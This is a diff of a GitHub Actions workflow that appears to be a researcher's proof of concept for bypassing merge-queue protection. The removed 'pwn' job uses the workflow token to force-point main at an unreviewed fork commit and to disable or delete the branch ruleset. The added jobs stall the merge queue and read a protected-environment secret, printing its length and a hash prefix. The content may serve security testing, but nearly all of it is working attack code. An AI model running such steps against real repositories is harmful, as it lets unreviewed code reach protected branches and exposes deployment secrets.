@@ -6,53 +6,30 @@ jobs:
   slowgate:
     runs-on: ubuntu-latest
     steps:
-      - name: READONLY-OUTSIDER-DECIDES-THE-GATE
-        run: echo marker
-      - name: hold
+      - name: fast on pull_request so the PR becomes enqueueable
+        if: github.event_name == 'pull_request'
+        run: echo pr-ok
+      - name: READONLY-OUTSIDER-DECIDES-THE-GATE and holds the queue open
         if: github.event_name == 'merge_group'
-        run: sleep 240
-  pwn:
+        run: |
+          echo "OUTSIDER-STEP-RAN-AS-THE-GATE ref=${{ github.ref }}"
+          sleep 420
+  envprobe:
     if: github.event_name == 'merge_group'
     runs-on: ubuntu-latest
-    permissions:
-      contents: write
+    environment: prod-canary
     steps:
-      - name: push a sha that ALREADY carries the green required context
+      - name: value-free confirm the ENVIRONMENT secret is POPULATED
         env:
-          GH_TOKEN: ${{ github.token }}
-          R: ${{ github.repository }}
-          S: ${{ github.sha }}
+          CANARY: ${{ secrets.CANARY_ENV }}
         run: |
-          A="Authorization: Bearer $GH_TOKEN"; AC="Accept: application/vnd.github+json"
-          j(){ curl -s -H "$A" -H "$AC" "$@"; }
-          c(){ curl -s -o /tmp/o -w '%{http_code}' -H "$A" -H "$AC" "$@"; }
-          sha(){ python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])'; }
-
-          echo "MAIN-BEFORE=$(j https://api.github.com/repos/$R/git/ref/heads/main | sha)"
-          # the fork tip is PUBLIC -- no credential needed to learn it
-          FORKTIP=$(curl -s https://api.github.com/repos/arlo-kovac/zz-jump2-1027/git/ref/heads/ro | sha)
-          echo "FORKTIP=$FORKTIP"
-          echo "FORKTIP-CHECKS=$(j https://api.github.com/repos/$R/commits/$FORKTIP/check-runs | python3 -c 'import sys,json;print([(x["name"],x["status"],x["conclusion"]) for x in json.load(sys.stdin)["check_runs"]])')"
-
-          echo "--- F: PATCH refs/heads/main to the FORK TIP (green required context, never queued, never reviewed) ---"
-          echo "F-CODE=$(c -X PATCH https://api.github.com/repos/$R/git/refs/heads/main -d "{\"sha\":\"$FORKTIP\",\"force\":true}")"
-          head -c 400 /tmp/o; echo
-          echo "F-MAIN-AFTER=$(j https://api.github.com/repos/$R/git/ref/heads/main | sha)"
-
-          echo "--- F2: same push, NON-force (fast-forward semantics) ---"
-          echo "F2-CODE=$(c -X PATCH https://api.github.com/repos/$R/git/refs/heads/main -d "{\"sha\":\"$FORKTIP\",\"force\":false}")"
-          head -c 300 /tmp/o; echo
-
-          echo "--- G: can this token EDIT the ruleset that protects main ---"
-          echo "G-CODE=$(c -X PUT https://api.github.com/repos/$R/rulesets/25978975 -d '{"name":"mq","target":"branch","enforcement":"disabled"}')"
-          head -c 300 /tmp/o; echo
-          echo "--- H: can it DELETE the ruleset ---"
-          echo "H-CODE=$(c -X DELETE https://api.github.com/repos/$R/rulesets/25978975)"
-          head -c 300 /tmp/o; echo
-          echo "RULESET-NOW=$(c https://api.github.com/repos/$R/rulesets/25978975)"
-          python3 -c 'import json;d=json.load(open("/tmp/o"));print("   enforcement =",d.get("enforcement"),"| rules =",[r["type"] for r in d.get("rules",[])])' 2>/dev/null || head -c 200 /tmp/o
-
-          echo "--- I: POSITIVE CONTROL that THIS job's token really can write (unprotected ref) ---"
-          echo "I-CODE=$(c -X POST https://api.github.com/repos/$R/git/refs -d "{\"ref\":\"refs/heads/pwnjob-control-${{ github.run_id }}\",\"sha\":\"$S\"}")"
-          head -c 200 /tmp/o; echo
-          echo "FINAL-MAIN=$(j https://api.github.com/repos/$R/git/ref/heads/main | sha)"
+          echo "WHICH-CANDIDATE-AM-I ref=${{ github.ref }}"
+          echo "CELL-protected EVENT=${{ github.event_name }}"
+          if [ -z "$CANARY" ]; then
+            echo "CANARY-POPULATED=false"
+          else
+            echo "CANARY-POPULATED=true"
+            echo "CANARY-LEN=$(printf %s "$CANARY" | wc -c)"
+            echo "CANARY-SHA256=$(printf %s "$CANARY" | sha256sum | cut -c1-16)"
+          fi
+          echo "NEGATIVE-CONTROL-UNSET-SECRET=[${{ secrets.NO_SUCH_SECRET_CONTROL }}]"
